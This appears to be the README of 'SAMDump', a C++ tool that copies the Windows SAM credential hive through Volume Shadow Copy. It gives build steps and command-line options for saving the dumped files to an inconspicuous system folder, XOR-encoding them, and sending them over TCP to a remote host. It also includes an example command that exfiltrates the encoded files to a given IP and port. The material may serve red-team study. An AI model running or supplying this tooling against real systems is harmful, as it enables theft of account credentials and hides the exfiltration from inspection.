# SAMDump — C++

C++ implementation using NT API calls and the VSS COM API directly. This is the initial implementation.

## Requirements

- Visual Studio with C++ workload
- Windows SDK (for VSS headers)
- Administrator privileges

## Compilation

Open `SAMDump.sln` in Visual Studio and build, or use the command line:

```
msbuild SAMDump.sln /p:Configuration=Release
```

## Usage

```
SAMDump.exe [OPTIONS]

Options:
  --save-local          Save files locally
  --output-dir <path>   Output directory (default: C:\Windows\tasks)
  --send-remote         Send files over TCP
  --host <ip>           Remote host (default: 127.0.0.1)
  --port <port>         Remote port (default: 7777)
  --xor-encode          XOR encode before save/send
  --xor-key <key>       XOR key (default: SAMDump2025)
  --disk <vol>          Volume for shadow copy (default: C:\)
  --shadow-device <dev> Use existing shadow device path (skip VSS)
  --help                Show help
```

### Save locally

```
SAMDump.exe --save-local --output-dir C:\temp
```

### Send to a remote server with XOR encoding

```
SAMDump.exe --send-remote --host 192.168.1.72 --port 7777 --xor-encode
```
